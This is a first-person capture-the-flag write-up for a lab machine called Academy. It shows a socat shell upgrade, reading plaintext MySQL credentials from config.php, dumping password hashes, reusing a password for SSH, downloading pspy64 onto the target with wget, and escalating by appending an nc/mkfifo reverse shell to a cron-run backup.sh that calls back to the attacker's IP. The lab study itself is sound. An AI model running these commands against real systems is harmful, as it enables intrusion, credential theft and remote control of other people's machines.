I first upgraded the shell that I got. On the kali machine I wrote:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

and on the target machine I wrote:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.126.129:4444
```

and just like that I got a better shell:

![](attachments/Pasted%20image%2020251125160005.png)

After that I found in the `/home/grimmie` a `backup.sh` which was saying:

```bash
ww-data@academy:/home/grimmie$ cat backup.sh 
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
```

so I went to `/var/www/html/academy/includes` and I found these files:

![](attachments/Pasted%20image%2020251125160227.png)

I read the `config.php` which had credentials for the `mySQL` database:

```php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");


?>
```

so I logged in to the mysql data with these credentials:
```bash
mysql -u grimmie -p
```

![](attachments/Pasted%20image%2020251125160435.png)

```mysql
select version();
```

![](attachments/Pasted%20image%2020251125161820.png)



```mysql
show databases;
```



![](attachments/Pasted%20image%2020251125160538.png)

I chose the `onilnecourse` database:
```mysql
use onlinecourse;
show tables;
```


![](attachments/Pasted%20image%2020251125162026.png)

I saw the `admin` table and I wanted to see what it contains:

```mysql
describe admin;
```


![](attachments/Pasted%20image%2020251125162134.png)

```mysql
select username, password from admin;
```


![](attachments/Pasted%20image%2020251125162216.png)

and this is again `MD5` hash so decrypting it the password is `admin` and I am able to login as `admin` in the academy website.


Now seeing the database `mysql`
```mysql
use mysql;
show tables;

MariaDB [mysql]> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
| user                      |
+---------------------------+
31 rows in set (0.000 sec)

```

we find a lot more tables and seeing the table `user`:
```mysql
describe user;

MariaDB [mysql]> describe user;
+------------------------+-----------------------------------+------+-----+----------+-------+
| Field                  | Type                              | Null | Key | Default  | Extra |
+------------------------+-----------------------------------+------+-----+----------+-------+
| Host                   | char(60)                          | NO   | PRI |          |       |
| User                   | char(80)                          | NO   | PRI |          |       |
| Password               | char(41)                          | NO   |     |          |       |
| Select_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Insert_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Update_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Delete_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Create_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Drop_priv              | enum('N','Y')                     | NO   |     | N        |       |
| Reload_priv            | enum('N','Y')                     | NO   |     | N        |       |
| Shutdown_priv          | enum('N','Y')                     | NO   |     | N        |       |
| Process_priv           | enum('N','Y')                     | NO   |     | N        |       |
| File_priv              | enum('N','Y')                     | NO   |     | N        |       |
| Grant_priv             | enum('N','Y')                     | NO   |     | N        |       |
| References_priv        | enum('N','Y')                     | NO   |     | N        |       |
| Index_priv             | enum('N','Y')                     | NO   |     | N        |       |
| Alter_priv             | enum('N','Y')                     | NO   |     | N        |       |
| Show_db_priv           | enum('N','Y')                     | NO   |     | N        |       |
| Super_priv             | enum('N','Y')                     | NO   |     | N        |       |
| Create_tmp_table_priv  | enum('N','Y')                     | NO   |     | N        |       |
| Lock_tables_priv       | enum('N','Y')                     | NO   |     | N        |       |
| Execute_priv           | enum('N','Y')                     | NO   |     | N        |       |
| Repl_slave_priv        | enum('N','Y')                     | NO   |     | N        |       |
| Repl_client_priv       | enum('N','Y')                     | NO   |     | N        |       |
| Create_view_priv       | enum('N','Y')                     | NO   |     | N        |       |
| Show_view_priv         | enum('N','Y')                     | NO   |     | N        |       |
| Create_routine_priv    | enum('N','Y')                     | NO   |     | N        |       |
| Alter_routine_priv     | enum('N','Y')                     | NO   |     | N        |       |
| Create_user_priv       | enum('N','Y')                     | NO   |     | N        |       |
| Event_priv             | enum('N','Y')                     | NO   |     | N        |       |
| Trigger_priv           | enum('N','Y')                     | NO   |     | N        |       |
| Create_tablespace_priv | enum('N','Y')                     | NO   |     | N        |       |
| Delete_history_priv    | enum('N','Y')                     | NO   |     | N        |       |
| ssl_type               | enum('','ANY','X509','SPECIFIED') | NO   |     |          |       |
| ssl_cipher             | blob                              | NO   |     | NULL     |       |
| x509_issuer            | blob                              | NO   |     | NULL     |       |
| x509_subject           | blob                              | NO   |     | NULL     |       |
| max_questions          | int(11) unsigned                  | NO   |     | 0        |       |
| max_updates            | int(11) unsigned                  | NO   |     | 0        |       |
| max_connections        | int(11) unsigned                  | NO   |     | 0        |       |
| max_user_connections   | int(11)                           | NO   |     | 0        |       |
| plugin                 | char(64)                          | NO   |     |          |       |
| authentication_string  | text                              | NO   |     | NULL     |       |
| password_expired       | enum('N','Y')                     | NO   |     | N        |       |
| is_role                | enum('N','Y')                     | NO   |     | N        |       |
| default_role           | char(80)                          | NO   |     |          |       |
| max_statement_time     | decimal(12,6)                     | NO   |     | 0.000000 |       |
+------------------------+-----------------------------------+------+-----+----------+-------+
```

we see that it has `user` column and `password` column.

```mysql
select user, password from user;
```


![](attachments/Pasted%20image%2020251125162622.png)

and we find the password hashes of the user `grimmie` and `root`.

I couldn't crack those passwords, so as a last resort I tried to ssh into the machine with the credentials that I found for `gremmie` with the password `My_V3ryS3cur3_P4ss` and it worked!!!


![](attachments/Pasted%20image%2020251125184328.png)


In my attacking machine I downloaded `pspy64` from the github `https://github.com/DominicBreuker/pspy?tab=readme-ov-file` and then I opened a python server into that directory `/Downloads'
```bash
python3 -m http.server 8003
```

and then at the targeting machine I downloaded the file and execute it:
```bash
wget http://192.168.126.129:8003/pspy64
chmod +x pspy64
./pspy64
```

and we see from the results that the `backup.sh` is running

![](attachments/Pasted%20image%2020251125185701.png)

so I put in the `backup.sh` a one-liner reverse shell:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.126.129 1234 >/tmp/f" >> backup.sh
```

and on the attacking machine I opened a `netcat`
```bash
nc -lvnp 1234
```

and after a minute I got a shell:

![](attachments/Pasted%20image%2020251125185917.png)